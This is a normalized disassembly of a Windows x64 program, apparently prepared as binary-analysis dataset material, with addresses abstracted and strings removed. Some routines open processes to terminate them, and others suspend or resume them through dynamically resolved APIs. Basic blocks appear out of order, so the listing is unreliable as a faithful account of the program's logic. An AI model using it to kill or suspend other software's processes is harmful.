mov [ rbp + 0x198 ] rdi
mov [ rbp + 0x188 ] di
lea r8d [ rdi + 0x6 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x188 ]
call sub_140001ea0
nop
mov [ rbp + 0x1c8 ] rsi
mov [ rbp + 0x1c0 ] rdi
mov [ rbp + 0x1b0 ] di
lea r8d [ rdi + 0x14 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x1b0 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x180 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_1400250d0 ]
mov [ rbp + 0xc0 ] r11
mov [ rbp + 0xe0 ] rsi
mov [ rbp + 0xd8 ] rdi
mov [ rbp + 0xc8 ] di
lea r8d [ rdi + 0x4 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xc8 ]
call sub_140001ea0
nop
mov [ rbp + 0x108 ] rsi
mov [ rbp + 0x100 ] rdi
mov [ rbp + 0xf0 ] di
lea r8d [ rdi + 0x22 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xf0 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0xc0 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140026150 ]
mov [ rbp + 0x60 ] r11
mov [ rbp + 0x80 ] rsi
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
mov r8d esi
lea rdx [ r--data ]
lea rcx [ rbp + 0x68 ]
call sub_140001ea0
nop
mov [ rbp + 0xa8 ] rsi
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
lea r8d [ rdi + 0x31 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x90 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140026400 ]
mov [ rbp + 0x120 ] r11
mov [ rbp + 0x140 ] rsi
mov [ rbp + 0x138 ] rdi
mov [ rbp + 0x128 ] di
lea r8d [ rdi + 0x3 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x128 ]
call sub_140001ea0
nop
mov [ rbp + 0x168 ] rsi
mov [ rbp + 0x160 ] rdi
mov [ rbp + 0x150 ] di
lea r8d [ rdi + 0x1a ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x150 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x120 ]
mov rcx rbx
call sub_140018d50
nop
cmp [ rbp + 0x168 ] 0x8
jb r-xdata
mov [ rbp + 0x168 ] rsi
mov [ rbp + 0x160 ] rdi
mov [ rbp + 0x150 ] di
cmp [ rbp + 0x140 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x150 ]
call j_sub_14003ad04
mov [ rbp + 0x140 ] rsi
mov [ rbp + 0x138 ] rdi
mov [ rbp + 0x128 ] di
cmp [ rbp + 0xa8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x128 ]
call j_sub_14003ad04
mov [ rbp + 0xa8 ] rsi
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x90 ]
call j_sub_14003ad04
mov [ rbp + 0x80 ] rsi
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
cmp [ rbp + 0x108 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_14003ad04
mov [ rbp + 0x108 ] rsi
mov [ rbp + 0x100 ] rdi
mov [ rbp + 0xf0 ] di
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xf0 ]
call j_sub_14003ad04
mov [ rbp + 0xe0 ] rsi
mov [ rbp + 0xd8 ] rdi
mov [ rbp + 0xc8 ] di
cmp [ rbp + 0x1c8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xc8 ]
call j_sub_14003ad04
mov [ rbp + 0x1c8 ] rsi
mov [ rbp + 0x1c0 ] rdi
mov [ rbp + 0x1b0 ] di
cmp [ rbp + 0x1a0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x1b0 ]
call j_sub_14003ad04
mov [ rbp + 0x1a0 ] rsi
mov [ rbp + 0x198 ] rdi
mov [ rbp + 0x188 ] di
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x188 ]
call j_sub_14003ad04
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_14003ad04
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_14003ad04
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] di
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x30 ]
call j_sub_14003ad04
mov rax rbx
mov rcx [ rbp + 0x1e0 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x2f0 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x8 ]
call j_sub_14003ad04
sub_140024e10
mov rax rsp
push rbp
push rdi
push r12
lea rbp [ rax - 0x5f ]
sub rsp 0xa0
mov [ rbp - 0x21 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x37 ] rax
mov rbx rcx
mov rdx [ rcx + 0x8 ]
cmp [ rcx ] rdx
je r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
add rdx 0xffffffffffffffd8
mov [ rbp - 0x1 ] 0x7
xor r12d r12d
mov [ rbp - 0x9 ] r12
mov [ rbp - 0x19 ] r12w
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rbp - 0x19 ]
call sub_140001dd0
nop
xor sil sil
xor dil dil
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp - 0x19 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
mov [ rbp - 0x39 ] 0xffffffffffffffff
mov [ rbp - 0x31 ] 0xffffffffffffffff
mov [ rbp - 0x29 ] r12
mov r8 [ rbx ]
mov rcx [ rbx + 0x8 ]
sub rcx r8
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
sub rdx 0x2
je r-xdata
cmp [ r8 + 0x18 ] 0x8
jb r-xdata
dec rdx
jne r-xdata
lea rdx [ r--data ]
mov rcx r8
call sub_14003bad0
test eax eax
jne r-xdata
mov r8 [ r8 ]
movzx r9d dil
movzx r8d sil
lea rdx [ rbp - 0x39 ]
lea rcx [ rbp - 0x19 ]
call sub_14000c8c0
test al al
je r-xdata
cmp [ r8 + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbx ]
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov sil 0x1
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0xf ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0x27 ] 0x8
jb r-xdata
test sil sil
je r-xdata
lea rdx [ r--data ]
mov rcx r8
call sub_14003bad0
test eax eax
jne r-xdata
mov r8 [ r8 ]
lea rdx [ r--data ]
call sub_14003bad0
test eax eax
jne r-xdata
mov rcx [ rcx ]
cmp [ rbp - 0x1 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xf ]
call j_sub_14003ad04
nop
test dil dil
je r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov edx [ rbp - 0x25 ]
call sub_140008400
mov rcx rax
call sub_140007970
jmp r-xdata
mov sil 0x1
lea edx [ rax + 0x1 ]
mov rcx rbx
call sub_140026f30
cmp [ rax + 0x18 ] 0x8
jb r-xdata
cmp [ rbp - 0x1 ] 0x8
jb r-xdata
mov dil 0x1
mov al 0x1
mov rcx [ rbp + 0x37 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xa0 ]
mov rbx [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rbp
retn
mov rcx [ rbp - 0x19 ]
call j_sub_14003ad04
jmp r-xdata
mov edx [ rbp - 0x25 ]
lea rcx [ rbp - 0x29 ]
call sub_1400268d0
jmp r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
lea rdx [ r--data ]
mov rcx rax
call sub_14003bad0
test eax eax
je r-xdata
mov rax [ rax ]
mov rcx [ rbp - 0x19 ]
call j_sub_14003ad04
jmp r-xdata
sub_1400250d0
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x5f ]
sub rsp 0xe0
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x2f ] rax
mov r12 rcx
mov rbx [ rcx ]
cmp rbx [ rcx + 0x8 ]
je r-xdata
mov al 0x1
mov rcx [ rbp + 0x2f ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xe0 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
xor r13d r13d
or r15 0xffffffffffffffff
mov rcx 0x7ffffffffffffffe
lea r14 [ rw-data ]
cmp rsi rcx
ja r-xdata
mov r8 r15
mov rdx rsi
lea rcx [ rsp + 0x28 ]
call sub_140002190
xor r8d r8d
xor edx edx
lea rcx [ rsp + 0x28 ]
call sub_140002190
jmp r-xdata
lea rcx [ r--data ]
call sub_1400378ec
cmp rsi r8
jbe r-xdata
xor sil sil
mov ecx 0x20
call sub_14003ac60
mov rdi rax
test rax rax
je r-xdata
test rsi rsi
jne r-xdata
xor r8d r8d
mov rdx rsi
lea rcx [ rsp + 0x28 ]
call sub_1400025a0
mov r8 [ rbp - 0x69 ]
jmp r-xdata
mov rdi r13
mov [ rax ] r13
mov [ rax + 0x8 ] r13
mov [ rax + 0x10 ] r13
jmp r-xdata
setne al
test al al
je r-xdata
mov [ rbp - 0x71 ] r13
mov [ rsp + 0x28 ] r13w
test rsi rsi
test rdi rdi
je r-xdata
mov r8 [ rdi ]
mov rcx [ rdi + 0x8 ]
sub rcx r8
mov rax 0x2e8ba2e8ba2e8ba3
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x1
sete sil
test sil sil
je r-xdata
lea rdx [ rsp + 0x28 ]
mov rcx rdi
call sub_14000c0b0
test al al
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
test sil sil
je r-xdata
mov rcx rdi
call sub_14000d510
mov rcx rdi
call j_sub_14003ad04
mov eax [ r8 ]
mov [ rbp - 0x59 ] eax
mov eax [ r8 + 0x4 ]
mov [ rbp - 0x55 ] eax
mov eax [ r8 + 0x8 ]
mov [ rbp - 0x51 ] eax
mov rax [ r8 + 0x10 ]
mov [ rbp - 0x49 ] rax
mov eax [ r8 + 0x18 ]
mov [ rbp - 0x41 ] eax
mov eax [ r8 + 0x1c ]
mov [ rbp - 0x3d ] eax
mov eax [ r8 + 0x20 ]
mov [ rbp - 0x39 ] eax
mov eax [ r8 + 0x24 ]
mov [ rbp - 0x35 ] eax
mov eax [ r8 + 0x28 ]
mov [ rbp - 0x31 ] eax
lea rdx [ r8 + 0x30 ]
mov r9 r15
xor r8d r8d
lea rcx [ rbp - 0x29 ]
call sub_140001dd0
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0x7 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rsi rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov edi r13d
mov rcx [ rsi ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
lea rdx [ rsp + 0x28 ]
call sub_14000ae70
mov rcx rax
mov edx 0x9
call sub_14000fe50
mov r8d [ rbp - 0x51 ]
xor edx edx
lea ecx [ rdx + 0x1 ]
call [ OpenProcess@IAT ]
mov rsi rax
test rax rax
je r-xdata
lea rcx [ rsp + 0x28 ]
cmp r8 0x8
cmovae rcx [ rsp + 0x28 ]
lea rdi [ rsi + rsi ]
mov r8 rdi
call sub_14003a8c0
mov [ rbp - 0x71 ] rsi
lea rax [ rsp + 0x28 ]
cmp [ rbp - 0x69 ] 0x8
cmovae rax [ rsp + 0x28 ]
mov [ rax + rdi ] r13w
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test edi edi
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
mov eax 0x4
cmove edi eax
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0x7 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
nop
cmp [ rbp + 0x1f ] 0x8
jb r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
cmp [ rbp + 0x1f ] 0x8
jb r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov edx 0xa
mov rcx r14
call sub_1400085e0
mov edi r13d
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + r14 + 0x10 ] 0x6
jne r-xdata
mov rcx [ rbp + 0x7 ]
call j_sub_14003ad04
xor edx edx
mov rcx rax
call [ TerminateProcess@IAT ]
test eax eax
setne dil
mov rcx rsi
call [ CloseHandle@IAT ]
test dil dil
je r-xdata
cmp [ rbp - 0x69 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x7 ]
call j_sub_14003ad04
nop
xor r8d r8d
call sub_140003120
nop
or edx 0x4
movsxd rcx [ rax + 0x4 ]
add rcx r14
test edi edi
je r-xdata
mov rcx [ rcx + r14 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
mov eax 0x4
cmove edi eax
mov rax [ rw-data ]
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
jmp r-xdata
mov [ rbp - 0x69 ] 0x7
mov [ rbp - 0x71 ] r13
mov [ rsp + 0x28 ] r13w
cmp [ rbp - 0x11 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x28 ]
call j_sub_14003ad04
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
add rbx 0x28
cmp rbx [ r12 + 0x8 ]
mov rcx 0x7ffffffffffffffe
jne r-xdata
mov rcx [ rbp - 0x29 ]
call j_sub_14003ad04
xor r8d r8d
call sub_140003120
jmp r-xdata
or edx 0x4
mov [ rbp - 0x11 ] 0x7
mov [ rbp - 0x19 ] r13
mov [ rbp - 0x29 ] r13w
mov r8d 0x7
mov [ rbp - 0x69 ] r8
mov [ rbp - 0x71 ] r13
mov [ rsp + 0x28 ] r13w
mov rsi [ rbx + 0x10 ]
cmp rsi 0xffffffffffffffff
cmova rsi r15
lea rax [ rsp + 0x28 ]
cmp rax rbx
jne r-xdata
jmp r-xdata
sub_140025530
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x5f ]
sub rsp 0xe0
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x2f ] rax
mov r12 rcx
mov rbx [ rcx ]
cmp rbx [ rcx + 0x8 ]
je r-xdata
mov al 0x1
mov rcx [ rbp + 0x2f ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xe0 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
xor r13d r13d
or r15 0xffffffffffffffff
mov rcx 0x7ffffffffffffffe
lea r14 [ rw-data ]
cmp rsi rcx
ja r-xdata
mov r8 r15
mov rdx rsi
lea rcx [ rsp + 0x28 ]
call sub_140002190
xor r8d r8d
xor edx edx
lea rcx [ rsp + 0x28 ]
call sub_140002190
jmp r-xdata
lea rcx [ r--data ]
call sub_1400378ec
cmp rsi r8
jbe r-xdata
xor sil sil
mov ecx 0x20
call sub_14003ac60
mov rdi rax
test rax rax
je r-xdata
test rsi rsi
jne r-xdata
xor r8d r8d
mov rdx rsi
lea rcx [ rsp + 0x28 ]
call sub_1400025a0
mov r8 [ rbp - 0x69 ]
jmp r-xdata
mov rdi r13
mov [ rax ] r13
mov [ rax + 0x8 ] r13
mov [ rax + 0x10 ] r13
jmp r-xdata
setne al
test al al
je r-xdata
mov [ rbp - 0x71 ] r13
mov [ rsp + 0x28 ] r13w
test rsi rsi
test rdi rdi
je r-xdata
mov r8 [ rdi ]
mov rcx [ rdi + 0x8 ]
sub rcx r8
mov rax 0x2e8ba2e8ba2e8ba3
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x1
sete sil
test sil sil
je r-xdata
lea rdx [ rsp + 0x28 ]
mov rcx rdi
call sub_14000c0b0
test al al
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
test sil sil
je r-xdata
mov rcx rdi
call sub_14000d510
mov rcx rdi
call j_sub_14003ad04
mov eax [ r8 ]
mov [ rbp - 0x59 ] eax
mov eax [ r8 + 0x4 ]
mov [ rbp - 0x55 ] eax
mov eax [ r8 + 0x8 ]
mov [ rbp - 0x51 ] eax
mov rax [ r8 + 0x10 ]
mov [ rbp - 0x49 ] rax
mov eax [ r8 + 0x18 ]
mov [ rbp - 0x41 ] eax
mov eax [ r8 + 0x1c ]
mov [ rbp - 0x3d ] eax
mov eax [ r8 + 0x20 ]
mov [ rbp - 0x39 ] eax
mov eax [ r8 + 0x24 ]
mov [ rbp - 0x35 ] eax
mov eax [ r8 + 0x28 ]
mov [ rbp - 0x31 ] eax
lea rdx [ r8 + 0x30 ]
mov r9 r15
xor r8d r8d
lea rcx [ rbp - 0x29 ]
call sub_140001dd0
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0x7 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rsi rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov edi r13d
mov rcx [ rsi ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
lea rdx [ rsp + 0x28 ]
call sub_14000ae70
mov rcx rax
mov edx 0x9
call sub_14000fe50
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
mov rcx rax
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov rdi rax
test rax rax
je r-xdata
lea rcx [ rsp + 0x28 ]
cmp r8 0x8
cmovae rcx [ rsp + 0x28 ]
lea rdi [ rsi + rsi ]
mov r8 rdi
call sub_14003a8c0
mov [ rbp - 0x71 ] rsi
lea rax [ rsp + 0x28 ]
cmp [ rbp - 0x69 ] 0x8
cmovae rax [ rsp + 0x28 ]
mov [ rax + rdi ] r13w
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test edi edi
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
mov eax 0x4
cmove edi eax
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0x7 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
nop
cmp [ rbp + 0x1f ] 0x8
jb r-xdata
mov r8d [ rbp - 0x51 ]
xor edx edx
mov ecx 0x800
call [ OpenProcess@IAT ]
mov rsi rax
test rax rax
je r-xdata
cmp [ rbp + 0x1f ] 0x8
jb r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov edx 0xa
mov rcx r14
call sub_1400085e0
mov edi r13d
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + r14 + 0x10 ] 0x6
jne r-xdata
mov rcx [ rbp + 0x7 ]
call j_sub_14003ad04
cmp rax 0xffffffffffffffff
je r-xdata
cmp [ rbp - 0x69 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x7 ]
call j_sub_14003ad04
nop
xor r8d r8d
call sub_140003120
nop
or edx 0x4
movsxd rcx [ rax + 0x4 ]
add rcx r14
test edi edi
je r-xdata
mov rcx [ rcx + r14 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
mov eax 0x4
cmove edi eax
mov rax [ rw-data ]
mov rcx rax
call rdi
test eax eax
sete dil
mov rcx rsi
call [ CloseHandle@IAT ]
test dil dil
je r-xdata
mov [ rbp - 0x69 ] 0x7
mov [ rbp - 0x71 ] r13
mov [ rsp + 0x28 ] r13w
cmp [ rbp - 0x11 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x28 ]
call j_sub_14003ad04
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
jmp r-xdata
add rbx 0x28
cmp rbx [ r12 + 0x8 ]
mov rcx 0x7ffffffffffffffe
jne r-xdata
mov rcx [ rbp - 0x29 ]
call j_sub_14003ad04
xor r8d r8d
call sub_140003120
jmp r-xdata
or edx 0x4
mov [ rbp - 0x11 ] 0x7
mov [ rbp - 0x19 ] r13
mov [ rbp - 0x29 ] r13w
mov r8d 0x7
mov [ rbp - 0x69 ] r8
mov [ rbp - 0x71 ] r13
mov [ rsp + 0x28 ] r13w
mov rsi [ rbx + 0x10 ]
cmp rsi 0xffffffffffffffff
cmova rsi r15
lea rax [ rsp + 0x28 ]
cmp rax rbx
jne r-xdata
jmp r-xdata
sub_1400259b0
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x5f ]
sub rsp 0xe0
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x2f ] rax
mov r12 rcx
mov rbx [ rcx ]
cmp rbx [ rcx + 0x8 ]
je r-xdata
mov al 0x1
mov rcx [ rbp + 0x2f ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xe0 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
xor r13d r13d
or r15 0xffffffffffffffff
mov rcx 0x7ffffffffffffffe
lea r14 [ rw-data ]
cmp rsi rcx
ja r-xdata
mov r8 r15
mov rdx rsi
lea rcx [ rsp + 0x28 ]
call sub_140002190
xor r8d r8d
xor edx edx
lea rcx [ rsp + 0x28 ]
call sub_140002190
jmp r-xdata
lea rcx [ r--data ]
call sub_1400378ec
cmp rsi r8
jbe r-xdata
xor sil sil
mov ecx 0x20
call sub_14003ac60
mov rdi rax
test rax rax
je r-xdata
test rsi rsi
jne r-xdata
xor r8d r8d
mov rdx rsi
lea rcx [ rsp + 0x28 ]
call sub_1400025a0
mov r8 [ rbp - 0x69 ]
jmp r-xdata
mov rdi r13
mov [ rax ] r13
mov [ rax + 0x8 ] r13
mov [ rax + 0x10 ] r13
jmp r-xdata
setne al
test al al
je r-xdata
mov [ rbp - 0x71 ] r13
mov [ rsp + 0x28 ] r13w
test rsi rsi
test rdi rdi
je r-xdata
mov r8 [ rdi ]
mov rcx [ rdi + 0x8 ]
sub rcx r8
mov rax 0x2e8ba2e8ba2e8ba3
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x1
sete sil
test sil sil
je r-xdata
lea rdx [ rsp + 0x28 ]
mov rcx rdi
call sub_14000c0b0
test al al
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
test sil sil
je r-xdata
mov rcx rdi
call sub_14000d510
mov rcx rdi
call j_sub_14003ad04
mov eax [ r8 ]
mov [ rbp - 0x59 ] eax
mov eax [ r8 + 0x4 ]
mov [ rbp - 0x55 ] eax
mov eax [ r8 + 0x8 ]
mov [ rbp - 0x51 ] eax
mov rax [ r8 + 0x10 ]
mov [ rbp - 0x49 ] rax
mov eax [ r8 + 0x18 ]
mov [ rbp - 0x41 ] eax
mov eax [ r8 + 0x1c ]
mov [ rbp - 0x3d ] eax
mov eax [ r8 + 0x20 ]
mov [ rbp - 0x39 ] eax
mov eax [ r8 + 0x24 ]
mov [ rbp - 0x35 ] eax
mov eax [ r8 + 0x28 ]
mov [ rbp - 0x31 ] eax
lea rdx [ r8 + 0x30 ]
mov r9 r15
xor r8d r8d
lea rcx [ rbp - 0x29 ]
call sub_140001dd0
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0x7 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rsi rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov edi r13d
mov rcx [ rsi ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
lea rdx [ rsp + 0x28 ]
call sub_14000ae70
mov rcx rax
mov edx 0x9
call sub_14000fe50
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
mov rcx rax
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov rdi rax
test rax rax
je r-xdata
lea rcx [ rsp + 0x28 ]
cmp r8 0x8
cmovae rcx [ rsp + 0x28 ]
lea rdi [ rsi + rsi ]
mov r8 rdi
call sub_14003a8c0
mov [ rbp - 0x71 ] rsi
lea rax [ rsp + 0x28 ]
cmp [ rbp - 0x69 ] 0x8
cmovae rax [ rsp + 0x28 ]
mov [ rax + rdi ] r13w
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test edi edi
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
mov eax 0x4
cmove edi eax
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0x7 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
nop
cmp [ rbp + 0x1f ] 0x8
jb r-xdata
mov r8d [ rbp - 0x51 ]
xor edx edx
mov ecx 0x800
call [ OpenProcess@IAT ]
mov rsi rax
test rax rax
je r-xdata
cmp [ rbp + 0x1f ] 0x8
jb r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov edx 0xa
mov rcx r14
call sub_1400085e0
mov edi r13d
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + r14 + 0x10 ] 0x6
jne r-xdata
mov rcx [ rbp + 0x7 ]
call j_sub_14003ad04
cmp rax 0xffffffffffffffff
je r-xdata
cmp [ rbp - 0x69 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x7 ]
call j_sub_14003ad04
nop
xor r8d r8d
call sub_140003120
nop
or edx 0x4
movsxd rcx [ rax + 0x4 ]
add rcx r14
test edi edi
je r-xdata
mov rcx [ rcx + r14 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
mov eax 0x4
cmove edi eax
mov rax [ rw-data ]
mov rcx rax
call rdi
test eax eax
sete dil
mov rcx rsi
call [ CloseHandle@IAT ]
test dil dil
je r-xdata
mov [ rbp - 0x69 ] 0x7
